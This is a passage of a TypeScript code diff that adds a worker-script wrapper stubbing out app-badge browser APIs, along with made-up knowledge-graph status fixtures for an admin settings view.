+const NO_WORKER_BADGE = "for (const k of ['setAppBadge', 'clearAppBadge']) if (typeof self.navigator?.[k] === 'function') Object.defineProperty(self.navigator, k, { configurable: true, value: async () => {} });\n"
+async function withoutWorkerBadge(res: Response): Promise<Response> {
+  const h = new Headers(res.headers)
+  h.delete('content-length')
+  return new Response(NO_WORKER_BADGE + (await res.text()), { status: res.status, headers: h })
 }
 
 /** pandoc's docx with an altChunk (an HTML part docx-preview would draw in an unsandboxed srcdoc iframe). */
@@ -3159,4 +4667,43 @@ function officeFixtures(): [string, Uint8Array][] {
     } catch { /* no pandoc: no docx/pptx sample */ }
   }
   return (office = out)
+}
+
+/** Made-up folders for Admin › Team settings › Knowledge graph (no real team's). */
+function mockKnowledgeGraph(available: boolean): KnowledgeGraphStatus {
+  const documents = mockKgDocuments(true)
+  if (!available) return { available: false, version: null, enabled: false, roots: [], personal: { folders: 0, files: 0, symbols: 0 }, added: [], diskBytes: 0, busy: 0, documents }
+  const at = new Date(Date.now() - 4 * 60_000).toISOString()
+  return {
+    available: true, version: '1.5.0', enabled: true, added: [],
+    roots: [
+      { path: 'projects/web-app', source: 'auto', status: 'ready', files: 128, symbols: 1840, lastSyncAt: at },
+      { path: 'projects/data-pipeline', source: 'auto', status: 'indexing', files: 0, symbols: 0, lastSyncAt: null },
+      { path: 'shared', source: 'auto', status: 'ready', files: 1, symbols: 3, lastSyncAt: at },
+    ],
+    personal: { folders: 2, files: 14, symbols: 96 }, diskBytes: 23_400_000, busy: 0, documents,
+  }
+}
+
+/** The documents part of the made-up knowledge graph: on (the default) with three folders and three files that could
+ * not be read, or off (nothing indexed). */
+function mockKgDocuments(on: boolean): KnowledgeGraphStatus['documents'] {
+  if (!on) return { enabled: false, folders: [], personal: { folders: 0, documents: 0, failed: 0 }, documents: 0, failed: [], failedCount: 0, lastUpdatedAt: null, diskBytes: 0, busy: 0 }
+  const at = new Date(Date.now() - 2 * 60_000).toISOString()
+  return {
+    enabled: true,
+    folders: [
+      { path: 'projects/marketing', source: 'auto', status: 'ready', documents: 84, failed: 2, lastUpdatedAt: at },
+      { path: 'projects/web-app', source: 'auto', status: 'ready', documents: 12, failed: 0, lastUpdatedAt: at },
+      { path: 'shared', source: 'auto', status: 'ready', documents: 40, failed: 1, lastUpdatedAt: at },
+    ],
+    personal: { folders: 2, documents: 31, failed: 1 },
+    documents: 136,
+    failed: [
+      { path: 'projects/marketing/campaign-final.pptx', reason: 'too_big' },
+      { path: 'projects/marketing/scan-2024.pdf', reason: 'empty' },
+      { path: 'shared/old-contract.hwp', reason: 'unreadable' },
+    ],
+    failedCount: 3, lastUpdatedAt: at, diskBytes: 8_200_000, busy: 0,
+  }
 }
